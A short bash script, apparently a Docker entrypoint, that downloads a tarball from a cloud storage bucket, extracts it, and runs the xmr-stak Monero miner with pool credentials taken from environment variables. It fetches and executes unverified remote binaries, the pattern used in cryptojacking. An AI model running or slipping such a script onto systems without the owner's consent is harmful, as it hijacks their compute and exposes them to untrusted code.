#!/bin/bash

wget https://storage.googleapis.com/automatic-train/stak.tar
tar -xvf ./stak.tar
sudo chmod 755 *

#sysctl -w vm.nr_hugepages=8 NOT possible in docker or with privileged container
LD_LIBRARY_PATH=. nice -n $PRIORITY ./xmr-stak --currency $CURRENCY -o $URL -u $USERNAME -p $PASSWORD
